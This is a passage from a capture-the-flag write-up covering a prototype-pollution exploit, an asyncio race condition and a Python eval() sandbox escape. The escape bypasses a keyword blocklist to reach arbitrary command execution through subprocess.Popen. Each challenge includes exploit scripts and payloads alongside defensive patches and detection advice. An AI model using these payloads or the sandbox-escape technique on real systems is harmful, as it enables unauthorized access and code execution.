        print(f"[+] FLAG: {m.group(0)}"); return 0
    print("[!] No flag found. Raw audit response:\n" + r.text); return 1

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <base_url>"); sys.exit(2)
    sys.exit(exploit(sys.argv[1]))
```

Run:

```bash
python3 exploit.py https://eci-2ze5moyf27tohdauwxot.cloudeci1.ichunqiu.com:80
# [*] Sending prototype pollution import ...
# [*] Checking session state ...
#     session -> viewer.isAdmin = True
# [*] Fetching /admin/audit ...
# [+] FLAG: flag{b11c8e15-5fca-4d1b-b3bd-3fd78714a3e9}
```


#### Defense

##### Constraints

- Project path: `/app/src/`
- `update.sh` may only use whitelisted commands: `mv`, `cp`, `rm`
- Submission is a `.tar.gz` (≤150 MB)
- Service auto-restarts after `update.sh` runs

##### Strategy

Ship the patched `profileStore.js` inside the archive and let `update.sh` overwrite the
vulnerable file with `cp` (whitelisted).

**`update.sh`:**

```sh
#!/bin/sh
cp profileStore.js /app/src/profileStore.js
```

##### Patched logic

Three guards close the hole in both `mergeProfile` and `deepCopy`:

1. **Forbidden-key filter:** skip `__proto__`, `constructor`, and `prototype`.
2. **`hasOwnProperty` guard:** iterate own keys only, never inherited ones.
3. **Type-safe recursion:** recurse only when the target slot is its own object,
   otherwise reset it to a fresh `{}`.

```text
const FORBIDDEN_KEYS = ["__proto__", "constructor", "prototype"];

function isForbiddenKey(key) {
  return FORBIDDEN_KEYS.indexOf(key) !== -1;
}

function deepCopy(value) {
  if (Array.isArray(value)) {
    return value.map(item => deepCopy(item));
  }
  if (isObject(value)) {
    const out = {};
    for (const key in value) {
      if (!Object.prototype.hasOwnProperty.call(value, key)) continue;
      if (isForbiddenKey(key)) continue;
      out[key] = deepCopy(value[key]);
    }
    return out;
  }
  return value;
}

function mergeProfile(target, source) {
  for (const key in source) {
    if (!Object.prototype.hasOwnProperty.call(source, key)) continue;
    if (isForbiddenKey(key)) continue;
    const value = source[key];
    if (isObject(value)) {
      if (!Object.prototype.hasOwnProperty.call(target, key) || !isObject(target[key])) {
        target[key] = {};
      }
      mergeProfile(target[key], value);
    } else {
      target[key] = deepCopy(value);
    }
  }
  return target;
}
```

> One catch found while testing: `FORBIDDEN_KEYS` must be declared **before**
> `let activeProfile = deepCopy(DEFAULT_PROFILE);`. `deepCopy` is a hoisted function
> declaration that runs at module load, but `const FORBIDDEN_KEYS` sits in the temporal
> dead zone until its own line runs. Put it after the `activeProfile` init and the
> module throws `ReferenceError: Cannot access 'FORBIDDEN_KEYS' before initialization`.

##### Complete patched `profileStore.js`

The full file as shipped in the archive. Only the two loops and the new key filter
differ from the original; `DEFAULT_PROFILE`, `isObject`, `normalizeImportDocument`,
`importProfile`, `getProfile`, and the exports are unchanged, so behavior for
legitimate imports stays identical.

```text
"use strict";

const DEFAULT_PROFILE = {
  displayName: "Guest",
  bio: "No profile imported yet.",
  privacy: {
    visibility: "public",
    searchable: true
  },
  dashboard: {
    modules: ["overview", "notes"],
    accent: "blue"
  },
  integrations: {
    calendar: false,
    storage: false
  }
};

const FORBIDDEN_KEYS = ["__proto__", "constructor", "prototype"];

function isForbiddenKey(key) {
  return FORBIDDEN_KEYS.indexOf(key) !== -1;
}

let activeProfile = deepCopy(DEFAULT_PROFILE);

function isObject(value) {
  return value !== null && typeof value === "object" && !Array.isArray(value);
}

function deepCopy(value) {
  if (Array.isArray(value)) {
    return value.map(item => deepCopy(item));
  }
  if (isObject(value)) {
    const out = {};
    for (const key in value) {
      if (!Object.prototype.hasOwnProperty.call(value, key)) {
        continue;
      }
      if (isForbiddenKey(key)) {
        continue;
      }
      out[key] = deepCopy(value[key]);
    }
    return out;
  }
  return value;
}

function mergeProfile(target, source) {
  for (const key in source) {
    if (!Object.prototype.hasOwnProperty.call(source, key)) {
      continue;
    }
    if (isForbiddenKey(key)) {
      continue;
    }
    const value = source[key];
    if (isObject(value)) {
      if (!Object.prototype.hasOwnProperty.call(target, key) || !isObject(target[key])) {
        target[key] = {};
      }
      mergeProfile(target[key], value);
    } else {
      target[key] = deepCopy(value);
    }
  }
  return target;
}

function normalizeImportDocument(document) {
  if (!isObject(document) || !isObject(document.importOptions) || !isObject(document.profile)) {
    throw new Error("profile import must contain importOptions and profile objects");
  }
  if (document.importOptions.mode !== "merge") {
    throw new Error("profile import mode must be merge");
  }
  if (document.importOptions.source !== "portal") {
    throw new Error("profile import source must be portal");
  }
  return document.profile;
}

function importProfile(document) {
  const importedProfile = normalizeImportDocument(document);
  const nextProfile = deepCopy(DEFAULT_PROFILE);
  mergeProfile(nextProfile, importedProfile);
  activeProfile = nextProfile;
  return deepCopy(activeProfile);
}

function getProfile() {
  return deepCopy(activeProfile);
}

module.exports = {
  importProfile,
  getProfile
};
```

##### Local verification

Load the patched module directly and run both the attack payload and a legitimate
import against it:

```bash
node -e '
const s = require("./profileStore.js");
// attack payload
s.importProfile({importOptions:{mode:"merge",source:"portal"},
                 profile:{"__proto__":{isAdmin:true}}});
console.log("polluted isAdmin on fresh obj?", ({}).isAdmin);
// legitimate import still works
const r = s.importProfile({importOptions:{mode:"merge",source:"portal"},
                           profile:{displayName:"X",dashboard:{accent:"teal"}}});
console.log("legit merge:", JSON.stringify(r));
console.log(({}).isAdmin === undefined ? "PATCH OK" : "STILL VULN");
'
```

Output:

```
polluted isAdmin on fresh obj? undefined
legit merge: {"displayName":"X","bio":"No profile imported yet.",
              "privacy":{...},"dashboard":{...,"accent":"teal"},"integrations":{...}}
PATCH OK
```

- The attack payload no longer pollutes (`({}).isAdmin === undefined`).
- Legitimate imports (`displayName`, nested `dashboard.accent`, and so on) still merge
  correctly, so nothing regresses.

##### Building and submitting the archive

Both files sit in a `patch/` directory. `update.sh` is at the archive root so the
grader runs it from there, and `cp` is one of the whitelisted commands.

```bash
cd patch
chmod +x update.sh
tar -czf ../patch.tar.gz update.sh profileStore.js
tar -tzvf ../patch.tar.gz   # confirm both entries are present
```

Archive contents:

```
update.sh
profileStore.js
```

Upload `patch.tar.gz` on the challenge's defense page (the `.gz` file selector, 150 MB
limit). When the grader runs `update.sh`, `cp` overwrites `/app/src/profileStore.js`
with the patched version and the service auto-restarts. After the restart:

- The attack request `{"profile":{"__proto__":{"isAdmin":true}}}` no longer flips
  `viewer.isAdmin`, so `/admin/audit` stays `Forbidden` for anonymous users.
- The flag endpoint and normal profile imports keep working, so the defense holds
  without breaking the service check.


#### Takeaways

- A recursive merge or clone over attacker JSON is a classic prototype-pollution sink.
  Any `for (const key in obj)` loop that reads `target[key]` and recurses can be steered
  into `Object.prototype` through a `__proto__` key from `JSON.parse`.
- Block the dangerous keys (`__proto__`, `constructor`, `prototype`) and gate loops with
  `hasOwnProperty`. Better still, use `Object.create(null)` maps, `Map`,
  `structuredClone`, or a vetted library such as lodash `merge` (4.17.11 or newer).
- The impact here was an authorization bypass. One shared mutable prototype turned an
  anonymous "Guest Viewer" into an admin with no credentials.
- For the patch, overwrite the single vulnerable file with a whitelisted `cp` in
  `update.sh`, and re-test that legitimate imports still work after patching.

---

### Async Report

| | |
|---|---|
| **Difficulty** | Medium |
| **Points** | 5 |
| **Target** | `https://eci-2zei673opu7bu4fa8rja.cloudeci1.ichunqiu.com:80` |
| **Flag** | `flag{bd1f4404-ac87-4371-9303-85088fd89170}` |


#### Overview

> The service is an enterprise async data report generator. To share request-level
> report configuration, a developer incorrectly stores the current user group in a
> global mutable context object.

The prompt names the bug class directly: request-scoped state stored in a
process-global object. Because the service runs on `asyncio`, that turns into an
async race condition, a TOCTOU between two concurrent coroutines that share mutable
state.

The attachment is a single file, `app.py`. It is a small HTTP server written
directly on `asyncio.start_server`, with no framework in between. The challenge has
two parts:

1. Attack: exploit the running container to read `/flag`.
2. Defense (AWD-style patch): submit a patch so the checker's exploit stops working
   while the service keeps its normal behavior.


#### Source analysis

The server exposes a few GET endpoints through a manual `dispatch()` router:

| Path                          | Handler                 | Purpose                                  |
| ----------------------------- | ----------------------- | ---------------------------------------- |
| `/`                           | `handle_home`           | Static dashboard HTML                    |
| `/api/health`                 | inline                  | Health check                             |
| `/user/preview`               | `handle_preview`        | Quick CSV preview (group forced `guest`) |
| `/user/preview_heavy_task`    | `handle_heavy_preview`  | Slow preview, sleeps 2s                  |
| `/admin/export_flag`          | `handle_admin_export`   | Returns the flag only if group is `root` |

##### 2.1 The shared global

```python
shared_context = {
    "current_user_group": "guest",
    "export_path": "/tmp/report.csv",
}
```

`shared_context` is a module-level dict, one object shared by every request the
process ever handles. There is a single event loop and a single worker, so every
coroutine mutates this same dict.

##### 2.2 The vulnerable handler

```python
async def handle_heavy_preview(query):
    group = query.get("debug_group", ["guest"])[0]
    shared_context["current_user_group"] = group          # (1) attacker-controlled write
    shared_context["export_path"] = f"/tmp/{html.escape(group)}_preview.csv"
    await asyncio.sleep(2.0)                               # (2) yields the event loop for 2s
    result = {
        "ok": True,
        "type": "heavy-preview",
        "group": shared_context["current_user_group"],
        "export_path": shared_context["export_path"],
    }
    shared_context["current_user_group"] = "guest"         # (3) reset, but only AFTER the sleep
    return json_response(200, result)
```

The `debug_group` query parameter is written straight into the global at (1) with
no validation, so a client can set `current_user_group` to any string, including
`root`.

##### 2.3 The auth check

```python
async def handle_admin_export():
    if shared_context.get("current_user_group") != "root":
        return response(403, "... root group required. ...")
    return response(200, f"flag export:\n{read_flag()}\n", "text/plain; charset=utf-8")
```

The gate to the flag is just a read of `shared_context["current_user_group"]`.

##### 2.4 Why it's exploitable: the await window

`asyncio` is cooperative, so a coroutine only yields control at an `await`. Between
(1) and (3), `handle_heavy_preview` hits `await asyncio.sleep(2.0)` at (2). That
suspends the coroutine and hands the single event loop back to the scheduler for a
full 2 seconds. During that window two things are true:

- `shared_context["current_user_group"] == "root"` (the attacker's value), and
- the loop is free to accept and fully service other connections.

So if a second request to `/admin/export_flag` arrives inside those 2 seconds, its
`handle_admin_export` runs the check, sees `"root"`, and returns the flag. The reset
to `"guest"` at (3) does not get to run first because it is parked behind the sleep.

This is a Time-Of-Check to Time-Of-Use (TOCTOU) race on shared mutable state. No
request can legitimately become `root`. The "authorization" is an accident of one
request leaking its transient state into another.

```
 time ──────────────────────────────────────────────────────────►
 conn A: /preview_heavy_task?debug_group=root
   set group=root ─┐
                   │        await sleep(2.0)  (loop free)          reset group=guest ─┐
                   └──────────────────────────────────────────────────────────────────┘
 conn B:                 /admin/export_flag
                           read group == "root"  → FLAG ✅
                    ▲──────── 2-second exploit window ────────▲
```


#### Exploitation

The plan:

1. Open connection A and send `GET /user/preview_heavy_task?debug_group=root`. This
   sets the global group to `root` and then blocks for 2 seconds.
2. While A is sleeping, open connection B and send `GET /admin/export_flag`. It reads
   `root` and returns the flag.

The container is served over TLS on the given host (the `:80` in the URL is proxied
to HTTPS), so the exploit disables certificate verification.

##### 3.1 Exploit script

```python
import asyncio, ssl

HOST = "eci-2zei673opu7bu4fa8rja.cloudeci1.ichunqiu.com"
PORT = 80

async def req(path):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    reader, writer = await asyncio.open_connection(HOST, PORT, ssl=ctx)
    writer.write(f"GET {path} HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n".encode())
    await writer.drain()
    data = await reader.read()
    writer.close()
    return data.decode("utf-8", "replace")

async def main():
    # (A) start the 2-second window with group = root
    heavy = asyncio.create_task(req("/user/preview_heavy_task?debug_group=root"))
    await asyncio.sleep(0.5)                       # ensure A has written group before B checks
    # (B) read the flag inside the window
    export = await req("/admin/export_flag")
    print("=== EXPORT ===")
    print(export)
    print("=== HEAVY ===")
    print(await heavy)

asyncio.run(main())
```

##### 3.2 Result

```
=== EXPORT ===
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 56
...
flag export:
flag{bd1f4404-ac87-4371-9303-85088fd89170}

=== HEAVY ===
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
...
{"ok": true, "type": "heavy-preview", "group": "root", "export_path": "/tmp/root_preview.csv"}
```

- **Flag:** `flag{bd1f4404-ac87-4371-9303-85088fd89170}`

> Note: the 2-second sleep makes the window very wide, so no repeated hammering is
> needed. A single well-timed second request wins every time. In a real system the
> window is usually microseconds and takes many attempts, but the bug is the same.


#### Defense

Constraints given by the platform:

- Project path: `/app/`
- `update.sh` may only use the whitelisted commands: `['mv', 'cp', 'rm']`
- The service auto-restarts after `update.sh` runs.

Since `update.sh` cannot call an editor or `sed`, the approach is to ship a fully
patched `app.py` next to `update.sh` and `cp` it into place.

##### 4.1 Root cause and fix

The root cause is request-scoped data living in a shared global across an `await`.
The fix is to keep that data request-local, in plain local variables inside the
coroutine, so no other coroutine can observe it. Once the group is never written
into `shared_context`, the global stays at its default `"guest"`, and
`/admin/export_flag` cannot be raced into returning the flag.

This also keeps the service's normal responses intact for the checker's SLA tests.
`handle_heavy_preview` still echoes the requested `group` and `export_path`, now
computed from locals instead of the shared dict.

##### 4.2 Patched handlers

```python
async def handle_preview(query):
    report_format = query.get("format", ["csv"])[0]
    group = "guest"                                  # request-local, not global
    body = {"ok": True, "type": "preview", "format": report_format, "group": group}
    return json_response(200, body)


async def handle_heavy_preview(query):
    # group + export_path are request-scoped: keep them in locals so a concurrent
    # request can never observe this request's group across the await below.
    group = query.get("debug_group", ["guest"])[0]
    export_path = f"/tmp/{html.escape(group)}_preview.csv"
    await asyncio.sleep(2.0)
    result = {"ok": True, "type": "heavy-preview", "group": group, "export_path": export_path}
    return json_response(200, result)


async def handle_admin_export():
    # shared_context is never mutated to "root" anymore, so this check only ever
    # reflects the trusted default and cannot be won via a race.
    if shared_context.get("current_user_group") != "root":
        return response(403, "<!doctype html><title>Forbidden</title><h1>Forbidden</h1><p>root group required.</p>")
    return response(200, f"flag export:\n{read_flag()}\n", "text/plain; charset=utf-8")
```

Everything else in `app.py` is byte-identical to the original.

##### 4.3 `update.sh`

```sh
#!/bin/sh
# Whitelisted commands only: mv, cp, rm
cp /app/app.py /app/app.py.bak     # keep a backup
cp app.py /app/app.py              # install the patched app
```

##### 4.4 Packaging

The submission is a `tar.gz` with both files at the archive root so `update.sh`
finds `app.py` next to itself:

```
patch.tar.gz
├── update.sh   (executable)
└── app.py      (patched)
```

##### 4.5 Patch verification

Running the patched app locally and replaying the same exploit:

```
ADMIN:   HTTP/1.1 403 Forbidden          # race is closed
HEAVY:   {"ok": true, "type": "heavy-preview", "group": "root", "export_path": "/tmp/root_preview.csv"}
PREVIEW: {"ok": true, "type": "preview", "format": "csv", "group": "guest"}
```

The admin export now returns 403 even during the heavy-preview window, while
`/user/preview`, `/user/preview_heavy_task`, and `/api/health` keep their original
response shapes. Functionality (SLA) is preserved and the vulnerability is gone.


#### Defensive analysis

##### 6.1 How the AWD patch mechanism works

The platform runs a whitelist over `update.sh` and only allows `mv`, `cp`, and `rm`.
That rules out in-place editing (`sed`, `patch`, `python -c`, a heredoc into a file),
so the patch cannot be expressed as a diff applied on the target. The working model
is instead "ship the whole fixed file and swap it in":

- The archive carries a complete `app.py` that already contains the fix.
- `update.sh` uses `cp` to overwrite `/app/app.py` (and keeps `app.py.bak` as a
  backup so a bad patch can be rolled back with a single `mv`).
- The platform restarts the service, so the new `app.py` is the process that serves
  traffic from then on.

Keeping `rm` in the whitelist matters for cleanup or for removing a stray file a
previous patch left behind. In this challenge only `cp` is needed.

##### 6.2 Why the patch does not break the SLA

An AWD checker scores two things at once: the service still works (SLA), and the
exploit no longer works (defense). A patch that closes the race but also changes a
normal response can lose SLA points, so the fix has to be surgical.

The patched handlers return the same JSON shape and the same field values a normal
client would see:

- `/user/preview` still returns `{"ok": true, "type": "preview", "format": ..., "group": "guest"}`.
- `/user/preview_heavy_task` still returns the requested `group` and the matching
  `export_path`, computed from locals instead of the shared dict.
- `/api/health` and `/` are untouched.

The only observable change is on `/admin/export_flag`, which now stays at 403. There
is no legitimate request that ever set the group to `root`, so a real client never
saw anything but 403 there anyway. The checker's benign traffic sees identical
behavior; only the race-based path is closed.

##### 6.3 Detecting the attack

The exploit has a clear signature that is easy to alert on:

- A `/admin/export_flag` request that returns 200 instead of 403. In the original
  design that can only happen during a race, so any 200 there is a strong signal.
- A `/user/preview_heavy_task` request carrying `debug_group=root` (or any value
  other than `guest`). The `debug_group` parameter is attacker-controlled and has no
  benign reason to be `root`.
- Overlapping requests in time: a `preview_heavy_task` still in its 2-second sleep
  while an `export_flag` request lands. Correlating request timestamps per connection
  exposes the interleave.

Logging the method, path, `debug_group`, and the effective `current_user_group` on
each admin request would surface the attack in access logs even without changing the
application logic.

##### 6.4 Hardening beyond the minimal patch

The submitted patch removes the shared write, which is enough to win the round. A
production fix would go further with defense in depth:

- Do not trust `debug_group` from the client at all. A debug-only group selector
  should be gated behind an authenticated admin session, not a query parameter.
- Give `handle_admin_export` a real authorization source (a signed session, a token,
  an allowlist of identities) instead of reading a mutable global that any handler
  can write.
- If any cross-request configuration genuinely has to be shared, store it per request
  with `contextvars.ContextVar`, or serialize check-and-use with an `asyncio.Lock`
  and never hold an elevated value across an `await`.


#### Takeaways

- Do not store request-scoped state in process globals. In any concurrent server
  (threads, async, or multiple processes with shared memory) a global is shared by
  every in-flight request. Use local variables, or an explicit per-request context
  object passed down the call chain.
- `await` is a yield point. In `asyncio`, any `await` can interleave another
  coroutine. State that looks fine between two lines of code is not fine if those
  lines straddle an `await` and touch shared data.
- Watch TOCTOU on authorization. The gap between checking a permission and using it
  is a reliable privilege-escalation primitive, especially when the permission lives
  in mutable shared state.
- Frameworks handle this for you. Real web frameworks give each request its own scope
  (context-locals via `contextvars`, or per-request objects) to avoid exactly this
  problem. A hand-rolled async server has to do the same by hand.

##### Alternative fixes

- Use `contextvars.ContextVar` for context-local storage that stays correct across
  `await` boundaries.
- Pass a per-request `context` dict or object explicitly into each handler instead of
  reading a module global.
- If shared state is genuinely required, guard the check-and-use as an atomic
  critical section with an `asyncio.Lock`, and never hold attacker-controlled
  elevated state across an `await`.


#### Appendix: files

- `extracted/app.py`: original vulnerable source
- `exploit.py`: attack script (Section 3.1)
- `patch/app.py`, `patch/update.sh`: defensive patch (Section 4)
- `patch.tar.gz`: packaged patch submission

---

### Regex Sync Rules

| | |
|---|---|
| **Points** | 5, plus persistent attack/defense points per round |
| **Target** | `https://eci-2ze9j9q4h4ds5bp4bx8i.cloudeci1.ichunqiu.com:5000` |
| **Flag** | `flag{37c73aa9-66f8-4a0a-b4a3-f3ba5030f126}` |
| **Vulnerability** | sandboxed `eval()` on a user-controlled "legacy replacement" expression, leading to a sandbox escape and RCE |
| **Fix** | replace `eval()` with a safe recursive-descent interpreter for the legacy grammar |


#### Overview

The application is an "enterprise cloud-sync platform" tool that previews filename normalization rules. An admin supplies three things:

- a Pattern, which is a regular expression with capture groups
- a Replacement, a legacy expression that references the capture groups
- a list of Filenames to test

The server applies the regex to each filename and renders the replacement, showing the resulting "target" name.

Documented replacement syntax:

- `$1`, `$2`, … for capture-group substitution
- `upper($1)`, `lower($1)` for case conversion
- `${date}` as a date placeholder
- string concatenation with `+`

The useful hint is in `/api/info`:

```text
{
  "legacy": "expression replacement mode remains enabled for old sync jobs",
  "syntax": ["$1 capture replacement","upper($1)","lower($1)","${date}","upper($1)+'-'+$2+'-'+$3+'.'+$4"]
}
```

"Expression replacement mode" is the tell. The replacement is turned into a real expression and evaluated.


#### Recon

##### 2.1 Home page and API

```bash
curl -sk "https://eci-2ze9j9q4h4ds5bp4bx8i.cloudeci1.ichunqiu.com:5000/"          # form posts to /rules/preview
curl -sk "https://eci-2ze9j9q4h4ds5bp4bx8i.cloudeci1.ichunqiu.com:5000/api/info"  # advertises legacy expression mode
```

The front-end POSTs the form to `/rules/preview` and renders the JSON.

##### 2.2 Normal request and the leak

```bash
curl -sk -X POST "https://eci-2ze9j9q4h4ds5bp4bx8i.cloudeci1.ichunqiu.com:5000/rules/preview" \
  --data-urlencode 'pattern=^([A-Z]{2})-(\d{4})-(.+)\.([a-z0-9]+)$' \
  --data-urlencode "replacement=upper(\$1)+'-'+\$2+'-'+\$3+'.'+\$4" \
  --data-urlencode $'filenames=HK-2026-invoice.csv'
```

Response:

```text
{
  "results": [{
    "expr": "str('HK').upper()+'-'+'2026'+'-'+'invoice'+'.'+'csv'",
    "matched": true,
    "source": "HK-2026-invoice.csv",
    "target": "HK-2026-invoice.csv"
  }],
  "success": true
}
```

The `expr` field gives the game away. The server translates the replacement into a Python expression and evaluates it:

- `upper($1)` becomes `str('HK').upper()`
- `$2` becomes `'2026'`
- `+` and string literals pass through unchanged

If we can control that expression, we control the `eval()`.


#### Probing the Sandbox

##### 3.1 Attribute access and function calls work

```bash
# attribute access
replacement=$1.__class__      ->  target: <class 'str'>
# function call
replacement=len($1)           ->  target: 3
# no capture ref / no call token -> treated as a literal string
replacement=7*7               ->  expr: '7*7'  (literal)
```

Two findings:

1. Attribute access is allowed. `$1.__class__` really evaluates.
2. A replacement only activates as code when it contains a capture reference (`$N`) or a call. Plain text is wrapped as a literal.

##### 3.2 The keyword blocklist (WAF)

Walking the class hierarchy fails:

```bash
replacement=$1.__class__.__base__.__subclasses__()
# -> "replacement rejected by legacy keyword filter: subclasses"
```

Enumerating the filter (substring match, case-insensitive) gives:

- Blocked: `import`, `eval`, `exec`, `system`, `subprocess`, `popen`, `globals`, `locals`, `builtins`, `__builtins__`, `__import__`, `open`, `read`, `mro`, `subclasses`, `flag`, `shell`, `warnings`, `loader`, `get_data`, `os.`, ` os`
- Allowed (relevant): `getattr`, `setattr`, `compile`, `base`, `class`, `dict`, and more

##### 3.3 The restricted namespace

Enumerating available names shows the `eval` globals are locked down to essentially `{str, len}`, plus the `upper`/`lower` method rewrites:

```
len   -> ok      str   -> ok
getattr -> name 'getattr' is not defined
type, list, dict, chr, ord, ... -> not defined
```

So there is no `getattr` and no builtins. But full attribute access and subscripting on real objects is permitted, and the blocklist is only a naive substring filter.


#### Exploitation: Sandbox Escape to RCE

##### 4.1 Strategy

The plan is the standard Python jail break: reach `object.__subclasses__()`, find a useful class (`subprocess.Popen`), and call it. Two obstacles stand in the way:

1. `subclasses` and `mro` are blocked as substrings.
2. `getattr` is undefined, so we cannot compute attribute names dynamically.

The bypass: attribute names have to be written literally, but `__dict__` subscript keys can be built by string concatenation, which slips past the substring filter.

```python
$1.__class__               # str
$1.__class__.__class__     # type
$1.__class__.__class__.__dict__['__subcla'+'sses__']   # the __subclasses__ method
```

`'__subcla'+'sses__'` never contains the literal substring `subclasses`, so the WAF does not see it.

##### 4.2 Getting the subclass list

```bash
replacement=$1.__class__.__class__.__dict__['__subcla'+'sses__']($1.__class__.__base__)
```

This calls `type.__subclasses__(object)` and returns the full list of loaded classes. It includes `subprocess.Popen`, `os._wrap_close`, and many Flask/Werkzeug/Jinja classes, which confirms a Flask app.

##### 4.3 Locating `subprocess.Popen`

Parse the returned list and find the index (deterministic per interpreter):

```
subprocess.Popen -> index 350
```

Verify:

```bash
replacement=...['__subcla'+'sses__'](...)[350]   ->  <class 'subprocess.Popen'>
```

##### 4.4 Calling Popen without tripping the WAF

`Popen(..., shell=True)` is blocked by the `shell` rule. We avoid it by passing an argv list and using positional arguments. `stdout` is the 5th positional parameter of `Popen`, so `-1` (which is `subprocess.PIPE`) enables output capture:

```python
Popen(args, bufsize=-1, executable=None, stdin=None, stdout=-1)
# positionally:  Popen(['id'], -1, None, None, -1)
```

Full replacement:

```
$1.__class__.__class__.__dict__['__subcla'+'sses__']($1.__class__.__base__)[350](['id'],-1,None,None,-1).communicate()[0]
```

Result:

```
abc -> b'uid=10001(appuser) gid=65534(nogroup) groups=65534(nogroup)\n'
```

That is remote code execution.

##### 4.5 Reading the flag

```bash
# locate it
[...][350](['ls','/'],-1,None,None,-1).communicate()[0]
# -> b'app\nbin\n...\nflag\n...'   (there is a /flag, 42 bytes)
```

`/flag` contains the blocked substring `flag`, so build the path by concatenation:

```
[...][350](['cat','/fl'+'ag'],-1,None,None,-1).communicate()[0]
```

Result:

```
b'flag{37c73aa9-66f8-4a0a-b4a3-f3ba5030f126}'
```

##### 4.6 One-shot exploit

```bash
HOST="https://eci-2ze9j9q4h4ds5bp4bx8i.cloudeci1.ichunqiu.com:5000"
P="\$1.__class__.__class__.__dict__['__subcla'+'sses__'](\$1.__class__.__base__)[350]"
curl -sk -X POST "$HOST/rules/preview" \
  --data-urlencode 'pattern=(.+)' \
  --data-urlencode "replacement=${P}(['cat','/fl'+'ag'],-1,None,None,-1).communicate()[0]" \
  --data-urlencode 'filenames=abc'
```

> Note: index `350` for `subprocess.Popen` is interpreter and version specific (Python 3.9.25 here). If it drifts, re-dump the subclass list and recompute. `os._wrap_close` (index 134) is an alternative pivot, but its `__init__.__globals__` route is blocked by the `globals` filter, so `Popen` via positional args is the cleaner path.

##### 4.7 Standalone exploit script

A self-contained exploit is provided as [`exploit.py`](./exploit.py). It finds
`subprocess.Popen`'s index dynamically (no hardcoded 350), splits any blocklisted
substrings automatically, and runs an arbitrary command:

```bash
python3 exploit.py                 # read /flag (default)
python3 exploit.py "id; uname -a"  # run any shell command
```

Core of the script:

```python
SUBS = ("$1.__class__.__class__.__dict__['__subcla'+'sses__']"
        "($1.__class__.__base__)")

def rce(cmd, popen_idx):
    argv = build_argv(cmd)  # ['sh','-c',cmd] with blocked words split via '+'
    replacement = f"{SUBS}[{popen_idx}]({argv},-1,None,None,-1).communicate()[0]"
    return eval(target(replacement)).decode()   # target() POSTs to /rules/preview
```


#### Root Cause (source analysis)

After getting RCE, `/app/app.py` was retrieved. The vulnerable core:

```python
def apply_rule(pattern, replacement, filenames):
    reject = waf_reject_reason(replacement)      # weak substring blocklist
    if reject:
        raise ValueError(reject)
    regex = re.compile(pattern)
    ...
        expr = compile_legacy_expression(replacement, match)   # builds a Python expr string
        target = eval(expr, {"__builtins__": {"str": str, "len": len}}, {"match": match})
        ...
```

`compile_legacy_expression` substitutes `$N` and `${date}`, rewrites `upper()`/`lower()`, then hands the result to `eval()`. The only protections are:

1. A substring blocklist (`BLOCKLIST`), which string concatenation, `__dict__` subscripting, and positional args all defeat.
2. A restricted `__builtins__` (`{str, len}`), which does not matter, because live objects expose the entire class graph through attribute access.

Neither is a real sandbox. The vulnerability is evaluating attacker-controlled expressions at all.


#### Defense

##### 6.1 Constraints

- Project path `/app/`, patch whitelist commands: `mv`, `cp`, `chmod`.
- Submit `update.sh` inside a `xxxx.tar.gz`; the service auto-restarts after it runs.
- Do not remove routes, break business logic, hardcode the flag or checker result, or blanket-reject rules.

##### 6.2 Fix strategy

Remove `eval()` entirely. Replace `replace_placeholders`, `compile_legacy_expression`, and the `eval` call with a recursive-descent interpreter (`render_legacy_replacement`) that computes the result directly from the regex match. It implements exactly the documented grammar and never constructs or executes any Python code:

```
expr   := term ('+' term)*
term    := string | group | date | func
func    := ('upper' | 'lower') '(' expr ')'
string  := "'" chars "'" | '"' chars '"'
group   := '$' digits
date    := '${date}'
```

Anything outside this grammar (attribute access, subscripting, arbitrary calls, `len(...)`, and so on) raises a `RuleSyntaxError`, which is reported through the existing error path.

Properties preserved:

- capture-group replacement, `upper`/`lower`, `${date}`, `+` concatenation, and string literals
- plain-constant replacements returned verbatim (historical behavior)
- the informational `expr` field, still produced in the same format
- every route (`/rules/preview`, `/submit`, `/api/info`, `/`, `/__checker/health`) left untouched
- error reporting, still returning `{"success": false, "message": "规则执行失败: ..."}`

##### 6.3 Patched interpreter

The vulnerable `replace_placeholders` and `compile_legacy_expression` functions are gone, along with the `eval` call. The replacement below parses the rule into values and a display string in a single pass, computing each value straight from the regex match. It returns a `(value, expr)` tuple so the response can keep the same `expr` field as before.

```python
class RuleSyntaxError(ValueError):
    """Raised when a legacy replacement rule cannot be parsed."""


def render_legacy_replacement(template, match):
    """Safely evaluate a legacy replacement rule.

    Supported grammar (identical to the documented legacy format):
        expr    := term ('+' term)*
        term    := string | group | date | func
        func    := ('upper' | 'lower') '(' expr ')'
        string  := "'" chars "'" | '"' chars '"'
        group   := '$' digits
        date    := '${date}'

    Unlike the historical implementation this never builds or evaluates a
    Python expression; every value is computed directly from the regex match,
    so arbitrary code execution is not possible.
    """
    values = {str(i): (v if v is not None else "") for i, v in enumerate(match.groups(), 1)}
    date_value = datetime.utcnow().strftime("%Y%m%d")
    s = template
    n = len(s)
    state = {"pos": 0}

    def error(msg):
        raise RuleSyntaxError("invalid replacement rule: " + msg)

    def skip_ws():
        while state["pos"] < n and s[state["pos"]] in " \t":
            state["pos"] += 1

    def parse_string(quote):
        state["pos"] += 1  # consume opening quote
        out = []
        while state["pos"] < n:
            char = s[state["pos"]]
            if char == "\\":
                if state["pos"] + 1 < n:
                    out.append(s[state["pos"] + 1])
                    state["pos"] += 2
                    continue
                out.append(char)
                state["pos"] += 1
                continue
            if char == quote:
                state["pos"] += 1
                value = "".join(out)
                return value, repr(value)
            out.append(char)
            state["pos"] += 1
        error("unterminated string literal")

    def parse_placeholder():
        if s.startswith("${date}", state["pos"]):
            state["pos"] += len("${date}")
            return date_value, repr(date_value)
        m = re.match(r"\$(\d+)", s[state["pos"]:])
        if not m:
            error("invalid placeholder")
        state["pos"] += len(m.group(0))
        value = values.get(m.group(1), "")
        return value, repr(value)

    def parse_term():
        skip_ws()
        if state["pos"] >= n:
            error("unexpected end of rule")
        char = s[state["pos"]]
        if char in ("'", '"'):
            return parse_string(char)
        if char == "$":
            return parse_placeholder()
        for fn in ("upper", "lower"):
            if s.startswith(fn, state["pos"]):
                cursor = state["pos"] + len(fn)
                while cursor < n and s[cursor] in " \t":
                    cursor += 1
                if cursor < n and s[cursor] == "(":
                    state["pos"] = cursor + 1
                    inner_value, inner_expr = parse_expr()
                    skip_ws()
                    if state["pos"] >= n or s[state["pos"]] != ")":
